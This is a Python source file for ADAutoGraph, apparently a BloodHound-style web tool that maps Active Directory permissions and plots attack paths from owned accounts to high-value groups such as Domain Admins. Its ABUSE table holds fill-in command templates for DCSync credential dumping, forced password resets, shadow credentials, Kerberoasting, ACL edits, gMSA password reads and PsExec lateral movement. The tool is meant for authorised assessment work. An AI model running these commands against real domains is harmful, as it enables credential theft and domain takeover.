#!/usr/bin/env python3
import argparse
import cgi
import json
import os
import posixpath
import sqlite3
import sys
import time
import urllib.parse
import zipfile
from collections import defaultdict, deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
WEB = ROOT / "web"
DATA = ROOT / "data"
DB_PATH = DATA / "graph.db"

TYPEMAP = {
    "users": "User",
    "groups": "Group",
    "computers": "Computer",
    "domains": "Domain",
    "gpos": "GPO",
    "ous": "OU",
    "containers": "Container",
}
HIGH_VALUE_NAMES = (
    "DOMAIN ADMINS",
    "ENTERPRISE ADMINS",
    "ADMINISTRATORS",
    "DOMAIN CONTROLLERS",
    "SCHEMA ADMINS",
    "ACCOUNT OPERATORS",
    "BACKUP OPERATORS",
    "KEY ADMINS",
    "ENTERPRISE KEY ADMINS",
    "SERVER OPERATORS",
    "PRINT OPERATORS",
    "KRBTGT",
)
ABUSABLE = {
    "genericall",
    "genericwrite",
    "writedacl",
    "writeowner",
    "owns",
    "addkeycredentiallink",
    "forcechangepassword",
    "allextendedrights",
    "writespn",
    "addspn",
    "addmember",
    "addself",
    "allowedtoact",
    "allowedtodelegate",
    "dcsync",
    "getchanges",
    "getchangesall",
    "synclapspassword",
    "adminto",
    "readgmsapassword",
    "writeaccountrestrictions",
}
RIGHT_RANK = {
    "dcsync": 0,
    "getchangesall": 0,
    "getchanges": 1,
    "genericall": 2,
    "writedacl": 3,
    "writeowner": 4,
    "owns": 4,
    "addkeycredentiallink": 5,
    "forcechangepassword": 6,
    "allextendedrights": 7,
    "genericwrite": 8,
    "writespn": 9,
    "addspn": 9,
    "addmember": 10,
    "addself": 10,
    "allowedtoact": 11,
    "allowedtodelegate": 12,
    "synclapspassword": 13,
    "adminto": 14,
    "readgmsapassword": 6,
    "writeaccountrestrictions": 15,
}

ABUSE = {
    "genericall": [
        {"os": "linux", "tool": "certipy shadow", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
        {"os": "linux", "tool": "bloodyAD password reset", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
    ],
    "genericwrite": [
        {"os": "linux", "tool": "targetedKerberoast", "cmd": "python3 targetedKerberoast.py -u '{src}' -p '<pass>' -d {domain} --dc-ip <dc-ip> --request-user {dst}"},
        {"os": "windows", "tool": "PowerView + Rubeus", "cmd": "Set-DomainObject -Identity {dst} -Set @{{serviceprincipalname='adapwn/http'}}; Rubeus.exe kerberoast /user:{dst} /nowrap"},
    ],
    "writedacl": [
        {"os": "linux", "tool": "impacket-dacledit", "cmd": "impacket-dacledit -action write -rights FullControl -principal '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
        {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainObjectAcl -TargetIdentity '{dst}' -PrincipalIdentity '{src}' -Rights All"},
    ],
    "writeowner": [
        {"os": "linux", "tool": "owneredit + dacledit", "cmd": "impacket-owneredit -action write -new-owner '{src}' -target '{dst}' {domain}/'{src}':'<pass>' -dc-ip <dc-ip>"},
        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainObjectOwner -Identity '{dst}' -OwnerIdentity '{src}'"},
    ],
    "addkeycredentiallink": [
        {"os": "linux", "tool": "certipy shadow", "cmd": "certipy shadow auto -u '{src}@{domain}' -p '<pass>' -account '{dst}' -dc-ip <dc-ip>"},
    ],
    "forcechangepassword": [
        {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> set password '{dst}' 'Newp@ss123!'"},
        {"os": "windows", "tool": "PowerView", "cmd": "Set-DomainUserPassword -Identity {dst} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
    ],
    "addmember": [
        {"os": "linux", "tool": "bloodyAD", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> add groupMember '{dst}' '{src}'"},
        {"os": "windows", "tool": "PowerView", "cmd": "Add-DomainGroupMember -Identity '{dst}' -Members '{src}'"},
    ],
    "dcsync": [
        {"os": "linux", "tool": "secretsdump", "cmd": "impacket-secretsdump {domain}/'{src}':'<pass>'@<dc> -just-dc"},
        {"os": "windows", "tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"},
    ],
    "adminto": [
        {"os": "linux", "tool": "psexec / evil-winrm", "cmd": "impacket-psexec {domain}/'{src}':'<pass>'@{dst}"},
        {"os": "windows", "tool": "PsExec", "cmd": "PsExec.exe \\\\{dst} cmd"},
    ],
    "readgmsapassword": [
        {"os": "linux", "tool": "netexec gMSA", "cmd": "nxc ldap <dc> -d {domain} -u '{src}' -p '<pass>' --gmsa"},
        {"os": "linux", "tool": "bloodyAD gMSA", "cmd": "bloodyAD -u '{src}' -p '<pass>' -d {domain} --host <dc> get object '{dst}' --attr msDS-ManagedPassword"},
    ],
}
for alias, target in {
    "owns": "writeowner",
    "addself": "addmember",
    "getchanges": "dcsync",
    "getchangesall": "dcsync",
    "allextendedrights": "dcsync",
    "writespn": "genericwrite",
    "addspn": "genericwrite",
    "allowedtoact": "adminto",
    "allowedtodelegate": "adminto",
    "synclapspassword": "genericall",
    "writeaccountrestrictions": "adminto",
}.items():
    ABUSE.setdefault(alias, ABUSE.get(target, []))


def key(right):
    return "".join(ch for ch in (right or "").lower() if ch.isalpha())


def short_name(label):
    return (label or "").split("@")[0].split(".")[0]


def edge_rank(edge, deg=None):
    deg = deg or {}
    return (
        RIGHT_RANK.get(key(edge["right_name"]), 80),
        -int(edge["abusable"]),
        -(deg.get(edge["source_sid"], 0) + deg.get(edge["target_sid"], 0)),
        edge["right_name"],
    )


def path_traversable(edge):
    right = key(edge["right_name"])
    return bool(edge["abusable"]) or right in {"memberof"}


def db():
    DATA.mkdir(exist_ok=True)
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")
    con.execute("PRAGMA foreign_keys=ON")
    con.executescript(
        """
        CREATE TABLE IF NOT EXISTS domains (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          name TEXT NOT NULL,
          source TEXT,
          created_at INTEGER NOT NULL,
          node_count INTEGER NOT NULL DEFAULT 0,
          edge_count INTEGER NOT NULL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS nodes (
          domain_id INTEGER NOT NULL,
          sid TEXT NOT NULL,
          label TEXT NOT NULL,
          type TEXT NOT NULL,
          high_value INTEGER NOT NULL DEFAULT 0,
          owned INTEGER NOT NULL DEFAULT 0,
          props TEXT NOT NULL DEFAULT '{}',
          PRIMARY KEY(domain_id, sid),
          FOREIGN KEY(domain_id) REFERENCES domains(id) ON DELETE CASCADE
        );
        CREATE TABLE IF NOT EXISTS edges (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          domain_id INTEGER NOT NULL,
          source_sid TEXT NOT NULL,
          target_sid TEXT NOT NULL,
          right_name TEXT NOT NULL,
          abusable INTEGER NOT NULL DEFAULT 0,
          props TEXT NOT NULL DEFAULT '{}',
          UNIQUE(domain_id, source_sid, target_sid, right_name),
          FOREIGN KEY(domain_id) REFERENCES domains(id) ON DELETE CASCADE
        );
        CREATE INDEX IF NOT EXISTS idx_nodes_domain_type ON nodes(domain_id, type);
        CREATE INDEX IF NOT EXISTS idx_nodes_label ON nodes(domain_id, label);
        CREATE INDEX IF NOT EXISTS idx_edges_domain_src ON edges(domain_id, source_sid);
        CREATE INDEX IF NOT EXISTS idx_edges_domain_dst ON edges(domain_id, target_sid);
        """
    )
    known = tuple(ABUSABLE)
    if known:
        placeholders = ",".join("?" for _ in known)
        con.execute(f"UPDATE edges SET abusable=1 WHERE lower(replace(right_name, ' ', '')) IN ({placeholders})", known)
    return con


def load_zip(path):
    files = {}
    with zipfile.ZipFile(path) as zf:
        for name in zf.namelist():
            if not name.lower().endswith(".json"):
                continue
            try:
                with zf.open(name) as fh:
                    files[name] = json.load(fh)
            except Exception:
                continue
    return files


def records(files):
    for _, doc in files.items():
        data = doc.get("data") if isinstance(doc, dict) else doc
        meta = doc.get("meta", {}) if isinstance(doc, dict) else {}
        dtype = (meta or {}).get("type", "")
        if isinstance(data, list):
            for row in data:
                yield dtype, row


def infer_domain(files):
    for dtype, row in records(files):
        if dtype != "domains":
            continue
        props = row.get("Properties") or {}
        name = props.get("name")
        if name:
            return name
    return "unknown.local"


def parse_bloodhound(path, domain_name=None):
    files = load_zip(path)
    domain_name = domain_name or infer_domain(files)
    nodes = {}
    edges = []

    def add_node(sid, label, ntype, high_value=False, props=None):
        if not sid:
            return
        current = nodes.get(sid)
        if current is None:
            nodes[sid] = {
                "sid": sid,
                "label": label or sid,
                "type": ntype or "Base",
                "high_value": bool(high_value),
                "owned": False,
                "props": props or {},
            }
            return
        if label and current["label"] == current["sid"]:
            current["label"] = label
        if ntype and current["type"] == "Base":
            current["type"] = ntype
        current["high_value"] = current["high_value"] or bool(high_value)
        if props:
            current["props"].update(props)

    def ensure(sid, ntype="Base"):
        if sid and sid not in nodes:
            add_node(sid, sid, ntype or "Base")

    for dtype, row in records(files):
        ntype = TYPEMAP.get(dtype, "Base")
        sid = row.get("ObjectIdentifier")
        props = row.get("Properties") or {}
        label = props.get("name") or props.get("distinguishedname") or sid
        high_value = bool(props.get("highvalue", False))
        if ntype == "Group" and any(part in (label or "").upper() for part in HIGH_VALUE_NAMES):
            high_value = True
        if ntype == "Domain":
            high_value = True
        add_node(sid, label, ntype, high_value, props)

    for dtype, row in records(files):
        sid = row.get("ObjectIdentifier")
        if not sid:
            continue
        for ace in row.get("Aces") or []:
            psid = ace.get("PrincipalSID")
            right = ace.get("RightName") or "ACE"
            if psid:
                ensure(psid, ace.get("PrincipalType", "Base"))
                edges.append((psid, sid, right, ace))
        for member in row.get("Members") or []:
            msid = member.get("ObjectIdentifier")
            if msid:
                ensure(msid, member.get("ObjectType", "Base"))
                edges.append((msid, sid, "MemberOf", member))
        for item in row.get("AllowedToAct") or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((aid, sid, "AllowedToAct", {}))
        local_admins = row.get("LocalAdmins") or {}
        results = local_admins.get("Results") if isinstance(local_admins, dict) else local_admins
        for item in results or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((aid, sid, "AdminTo", {}))
        for item in row.get("AllowedToDelegate") or []:
            aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
            if aid:
                ensure(aid)
                edges.append((sid, aid, "AllowedToDelegate", {}))
    return domain_name, list(nodes.values()), edges


def import_zip(path, requested_name=None, source=None):
    domain_name, nodes, edges = parse_bloodhound(path, requested_name)
    con = db()
    with con:
        cur = con.execute(
            "INSERT INTO domains(name, source, created_at, node_count, edge_count) VALUES(?,?,?,?,?)",
            (domain_name, source or os.path.basename(path), int(time.time()), len(nodes), len(edges)),
        )
        domain_id = cur.lastrowid
        con.executemany(
            """
            INSERT INTO nodes(domain_id, sid, label, type, high_value, owned, props)
            VALUES(?,?,?,?,?,?,?)
            """,
            [
                (
                    domain_id,
                    n["sid"],
                    n["label"],
                    n["type"],
                    int(n["high_value"]),
                    int(n["owned"]),
                    json.dumps(n["props"], separators=(",", ":")),
                )
                for n in nodes
            ],
        )
        con.executemany(
            """
            INSERT OR IGNORE INTO edges(domain_id, source_sid, target_sid, right_name, abusable, props)
            VALUES(?,?,?,?,?,?)
            """,
            [
                (
                    domain_id,
                    s,
                    t,
                    right,
                    int(key(right) in ABUSABLE),
                    json.dumps(props or {}, separators=(",", ":")),
                )
                for s, t, right, props in edges
            ],
        )
        edge_count = con.execute("SELECT COUNT(*) FROM edges WHERE domain_id=?", (domain_id,)).fetchone()[0]
        con.execute("UPDATE domains SET edge_count=? WHERE id=?", (edge_count, domain_id))
    con.close()
    return domain_id


def graph_payload(domain_id, view="overview", q="", focus="", rel="abusable", limit=650):
    con = db()
    node_rows = con.execute("SELECT * FROM nodes WHERE domain_id=?", (domain_id,)).fetchall()
    edge_rows = con.execute("SELECT * FROM edges WHERE domain_id=?", (domain_id,)).fetchall()
    con.close()

    by_sid = {row["sid"]: row for row in node_rows}
    deg = defaultdict(int)
    out = defaultdict(list)
    inc = defaultdict(list)
    for edge in edge_rows:
        deg[edge["source_sid"]] += 1
        deg[edge["target_sid"]] += 1
        out[edge["source_sid"]].append(edge)
        inc[edge["target_sid"]].append(edge)
    ranked_edges = sorted(edge_rows, key=lambda e: edge_rank(e, deg))

    def add_shortest_attack_paths():
        starts = [row["sid"] for row in node_rows if row["owned"]]
        targets = {row["sid"] for row in node_rows if row["high_value"]}
        if not starts or not targets:
            return
        adj = defaultdict(list)
        for edge in edge_rows:
            if path_traversable(edge):
                adj[edge["source_sid"]].append(edge)
        def emit_path(prev, prev_edge, end):
            cur = end
            visible.add(cur)
            while prev.get(cur) is not None:
                edge = prev_edge[cur]
                edge_scope.add(edge["id"])
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                cur = prev[cur]

        for start in starts[:20]:
            prev = {start: None}
            prev_edge = {}
            depth = {start: 0}
            qpath = deque([start])
            hit = None
            while qpath and hit is None:
                cur = qpath.popleft()
                if cur in targets and cur != start:
                    hit = cur
                    break
                if depth[cur] >= 7:
                    continue
                for edge in sorted(adj.get(cur, []), key=lambda e: edge_rank(e, deg))[:80]:
                    nxt = edge["target_sid"]
                    if nxt not in prev:
                        prev[nxt] = cur
                        prev_edge[nxt] = edge
                        depth[nxt] = depth[cur] + 1
                        qpath.append(nxt)
            if hit is not None:
                emit_path(prev, prev_edge, hit)
                continue
            # No DA/HV route: still show the best reachable attack chain so the
            # operator sees useful pivots instead of an empty canvas.
            candidates = [
                sid for sid in prev
                if sid != start and prev.get(sid) is not None
            ]
            candidates.sort(
                key=lambda sid: (
                    0 if (by_sid.get(sid)["high_value"] if by_sid.get(sid) else 0) else 1,
                    -depth.get(sid, 0),
                    -deg.get(sid, 0),
                    by_sid.get(sid)["label"] if by_sid.get(sid) else sid,
                )
            )
            for sid in candidates[:3]:
                emit_path(prev, prev_edge, sid)

    visible = set()
    edge_scope = set()
    q = (q or "").lower().strip()
    focus = focus or ""
    rel = rel or "abusable"
    if focus and focus in by_sid:
        visible.add(focus)
        if rel in ("outbound", "all", "abusable"):
            for edge in out[focus]:
                if rel == "abusable" and not edge["abusable"]:
                    continue
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
        if rel in ("inbound", "all", "abusable"):
            for edge in inc[focus]:
                if rel == "abusable" and not edge["abusable"]:
                    continue
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    elif q:
        for row in node_rows:
            if q in row["label"].lower() or q in row["sid"].lower():
                visible.add(row["sid"])
        for sid in list(visible):
            for edge in out[sid]:
                if edge["abusable"]:
                    visible.add(edge["target_sid"])
                    edge_scope.add(edge["id"])
            for edge in inc[sid]:
                if edge["abusable"]:
                    visible.add(edge["source_sid"])
                    edge_scope.add(edge["id"])
    elif view == "all":
        visible = {row["sid"] for row in sorted(node_rows, key=lambda r: deg[r["sid"]], reverse=True)[:limit]}
    elif view == "owned":
        visible = {row["sid"] for row in node_rows if row["owned"]}
        for sid in list(visible):
            for edge in out[sid] + inc[sid]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    elif view == "highvalue":
        visible = {row["sid"] for row in node_rows if row["high_value"]}
        for sid in list(visible):
            for edge in inc[sid]:
                if edge["abusable"]:
                    visible.add(edge["source_sid"])
                    edge_scope.add(edge["id"])
    elif view == "paths":
        add_shortest_attack_paths()
    elif view == "acl":
        max_edges = min(180, max(80, limit // 3))
        for edge in ranked_edges:
            if edge["abusable"]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
                if len(edge_scope) >= max_edges or len(visible) >= limit:
                    break
    else:
        max_edges = min(140, max(70, limit // 4))
        for edge in ranked_edges:
            if edge["abusable"]:
                visible.add(edge["source_sid"])
                visible.add(edge["target_sid"])
                edge_scope.add(edge["id"])
                if len(edge_scope) >= max_edges:
                    break
        if len(visible) < 30:
            for row in node_rows:
                if row["high_value"] or row["owned"]:
                    visible.add(row["sid"])
    expanded = set(visible)
    if not focus and view in ("all",):
        for sid in list(visible):
            for edge in out[sid][:10] + inc[sid][:10]:
                expanded.add(edge["source_sid"])
                expanded.add(edge["target_sid"])
                edge_scope.add(edge["id"])
    if len(expanded) > limit:
        keep = {sid for sid in expanded if by_sid[sid]["high_value"] or by_sid[sid]["owned"]}
        for sid in sorted(expanded - keep, key=lambda s: deg[s], reverse=True):
            keep.add(sid)
            if len(keep) >= limit:
                break
        expanded = keep

    idx = {}
    nodes = []
    for sid in sorted(expanded, key=lambda s: (by_sid[s]["type"], -deg[s], by_sid[s]["label"])):
        row = by_sid[sid]
        idx[sid] = len(nodes)
        nodes.append(
            {
                "id": sid,
                "label": row["label"],
                "type": row["type"],
                "highValue": bool(row["high_value"]),
                "owned": bool(row["owned"]),
                "degree": deg[sid],
            }
        )
    edges = []
    for edge in edge_rows:
        if edge_scope and edge["id"] not in edge_scope:
            continue
        if edge["source_sid"] in idx and edge["target_sid"] in idx:
            edges.append(
                {
                    "id": edge["id"],
                    "source": idx[edge["source_sid"]],
                    "target": idx[edge["target_sid"]],
                    "sourceSid": edge["source_sid"],
                    "targetSid": edge["target_sid"],
                    "right": edge["right_name"],
                    "abusable": bool(edge["abusable"]),
                }
            )
    return {
        "nodes": nodes,
        "edges": edges,
        "totalNodes": len(node_rows),
        "totalEdges": len(edge_rows),
        "focus": focus,
        "relationMode": rel,
    }


def search_nodes(domain_id, q):
    q = f"%{(q or '').strip()}%"
    con = db()
    rows = con.execute(
        """
        SELECT sid,label,type,high_value,owned FROM nodes
        WHERE domain_id=? AND (label LIKE ? OR sid LIKE ?)
        ORDER BY owned DESC, high_value DESC, label ASC
        LIMIT 50
        """,
        (domain_id, q, q),
    ).fetchall()
    con.close()
    return [
        {"id": r["sid"], "label": r["label"], "type": r["type"], "highValue": bool(r["high_value"]), "owned": bool(r["owned"])}
        for r in rows
    ]


def domain_stats(domain_id):
    con = db()
    by_type = con.execute(
        "SELECT type, COUNT(*) count FROM nodes WHERE domain_id=? GROUP BY type ORDER BY count DESC",
        (domain_id,),
    ).fetchall()
    row = con.execute(
        """
        SELECT
          SUM(high_value) high_value,
          SUM(owned) owned,
          COUNT(*) nodes
        FROM nodes WHERE domain_id=?
        """,
        (domain_id,),
    ).fetchone()
    edge = con.execute(
        """
        SELECT
          SUM(abusable) abusable,
          COUNT(*) edges
        FROM edges WHERE domain_id=?
        """,
        (domain_id,),
    ).fetchone()
    rights = con.execute(
        """
        SELECT right_name, COUNT(*) count
        FROM edges
        WHERE domain_id=? AND abusable=1
        GROUP BY right_name
        ORDER BY count DESC
        LIMIT 8
        """,
        (domain_id,),
    ).fetchall()
    con.close()
    return {
        "nodes": row["nodes"] or 0,
        "edges": edge["edges"] or 0,
        "abusable": edge["abusable"] or 0,
        "highValue": row["high_value"] or 0,
        "owned": row["owned"] or 0,
        "types": [dict(r) for r in by_type],
        "rights": [dict(r) for r in rights],
    }


def node_detail(domain_id, sid):
    con = db()
    node = con.execute("SELECT * FROM nodes WHERE domain_id=? AND sid=?", (domain_id, sid)).fetchone()
    if not node:
        con.close()
        return None
    outgoing = con.execute(
        """
        SELECT e.*, n.label target_label, n.type target_type
        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
        WHERE e.domain_id=? AND e.source_sid=?
        ORDER BY e.abusable DESC, e.right_name ASC LIMIT 120
        """,
        (domain_id, sid),
    ).fetchall()
    incoming = con.execute(
        """
        SELECT e.*, n.label source_label, n.type source_type
        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.source_sid
        WHERE e.domain_id=? AND e.target_sid=?
        ORDER BY e.abusable DESC, e.right_name ASC LIMIT 120
        """,
        (domain_id, sid),
    ).fetchall()
    domain = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()["name"]
    con.close()
    try:
        props = json.loads(node["props"] or "{}")
    except Exception:
        props = {}
    return {
        "id": node["sid"],
        "label": node["label"],
        "type": node["type"],
        "highValue": bool(node["high_value"]),
        "owned": bool(node["owned"]),
        "props": props,
        "outgoingCount": len(outgoing),
        "incomingCount": len(incoming),
        "outgoing": [
            {
                "target": e["target_sid"],
                "targetLabel": e["target_label"],
                "targetType": e["target_type"],
                "right": e["right_name"],
                "abusable": bool(e["abusable"]),
                "abuse": abuse_for(e["right_name"], node["label"], e["target_label"], domain),
            }
            for e in outgoing
        ],
        "incoming": [
            {
                "source": e["source_sid"],
                "sourceLabel": e["source_label"],
                "sourceType": e["source_type"],
                "right": e["right_name"],
                "abusable": bool(e["abusable"]),
            }
            for e in incoming
        ],
    }


def abuse_for(right, src, dst, domain):
    rows = ABUSE.get(key(right), [])
    src_short = short_name(src)
    dst_short = short_name(dst)
    return [
        {
            "os": row["os"],
            "tool": row["tool"],
            "cmd": row["cmd"].format(src=src_short, dst=dst_short, domain=domain),
        }
        for row in rows
    ]


class Handler(BaseHTTPRequestHandler):
    server_version = "ADAutoGraph/0.1"

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))

    def send_json(self, data, status=200):
        raw = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def send_file(self, path):
        if not path.exists() or not path.is_file():
            self.send_error(404)
            return
        ctype = "text/html"
        if path.suffix == ".js":
            ctype = "application/javascript"
        elif path.suffix == ".css":
            ctype = "text/css"
        raw = path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)
        try:
            if path == "/":
                return self.send_file(WEB / "index.html")
            if path.startswith("/static/"):
                rel = posixpath.normpath(path[len("/static/") :])
                if rel.startswith("../"):
                    return self.send_error(403)
                return self.send_file(WEB / rel)
            if path == "/api/domains":
                con = db()
                rows = con.execute("SELECT * FROM domains ORDER BY created_at DESC").fetchall()
                con.close()
                return self.send_json({"domains": [dict(r) for r in rows]})
            if path.startswith("/api/domain/") and path.endswith("/graph"):
                domain_id = int(path.split("/")[3])
                view = qs.get("view", ["overview"])[0]
                query = qs.get("q", [""])[0]
                focus = qs.get("focus", [""])[0]
                rel = qs.get("rel", ["abusable"])[0]
                limit = min(2000, max(20, int(qs.get("limit", ["650"])[0])))
                return self.send_json(graph_payload(domain_id, view, query, focus, rel, limit))
            if path.startswith("/api/domain/") and path.endswith("/search"):
                domain_id = int(path.split("/")[3])
                return self.send_json({"nodes": search_nodes(domain_id, qs.get("q", [""])[0])})
            if path.startswith("/api/domain/") and path.endswith("/stats"):
                domain_id = int(path.split("/")[3])
                return self.send_json(domain_stats(domain_id))
            if path.startswith("/api/domain/") and "/node/" in path:
                parts = path.split("/")
                domain_id = int(parts[3])
                sid = urllib.parse.unquote(parts[5])
                detail = node_detail(domain_id, sid)
                return self.send_json(detail or {"error": "not found"}, 200 if detail else 404)
        except Exception as exc:
            return self.send_json({"error": str(exc)}, 500)
        self.send_error(404)

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        try:
            if path == "/api/import":
                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={"REQUEST_METHOD": "POST"})
                # NB: use `is None`, never `not fileitem` — cgi.FieldStorage.__bool__
                # raises TypeError("Cannot be converted to bool.") for a single file
                # field (its .list is None), which would 500 every upload.
                fileitem = form["zip"] if "zip" in form else None
                if fileitem is None or not getattr(fileitem, "file", None):
                    return self.send_json({"error": "missing zip"}, 400)
                name = form.getfirst("name") or None
                tmp = DATA / ("upload_%d.zip" % int(time.time() * 1000))
                with tmp.open("wb") as out:
                    while True:
                        chunk = fileitem.file.read(1024 * 1024)
                        if not chunk:
                            break
                        out.write(chunk)
                domain_id = import_zip(tmp, name, getattr(fileitem, "filename", None))
                tmp.unlink(missing_ok=True)
                return self.send_json({"ok": True, "domainId": domain_id})
            if path.startswith("/api/domain/") and "/owned/" in path:
                parts = path.split("/")
                domain_id = int(parts[3])
                sid = urllib.parse.unquote(parts[5])
                con = db()
                row = con.execute("SELECT owned FROM nodes WHERE domain_id=? AND sid=?", (domain_id, sid)).fetchone()
                if not row:
                    con.close()
                    return self.send_json({"error": "not found"}, 404)
                owned = 0 if row["owned"] else 1
                with con:
                    con.execute("UPDATE nodes SET owned=? WHERE domain_id=? AND sid=?", (owned, domain_id, sid))
                con.close()
                return self.send_json({"ok": True, "owned": bool(owned)})
        except Exception as exc:
            return self.send_json({"error": str(exc)}, 500)
        self.send_error(404)


def main():
    parser = argparse.ArgumentParser(description="ADAutoGraph local BloodHound-style web UI")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8765)
    args = parser.parse_args()
    db().close()
    httpd = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"ADAutoGraph listening on http://{args.host}:{args.port}")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
